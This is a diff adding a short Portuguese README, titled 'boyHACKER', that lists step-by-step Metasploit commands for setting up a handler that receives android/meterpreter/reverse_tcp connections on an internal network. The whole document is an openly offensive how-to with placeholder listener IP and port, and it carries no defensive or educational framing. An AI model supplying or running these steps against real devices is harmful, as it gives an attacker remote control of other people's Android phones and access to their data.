@@ -1,0 +1,12 @@
+# boyHACKER
+
+COMO CONGIFURAR O METASPLOIT EM ANDROID NA REDE INTERNA :
+
+1- msfdb init
+2- service  postgresql start
+3- msfconsole
+4- use exploit/multi/handler
+5- set payload android/meterpreter/reverse_tcp
+6- set LHOST ipusado
+7- set LPORT portausada
+8 - verique se a porta e o ip esta em "YES" usando a opcao show options se sim digite exploit
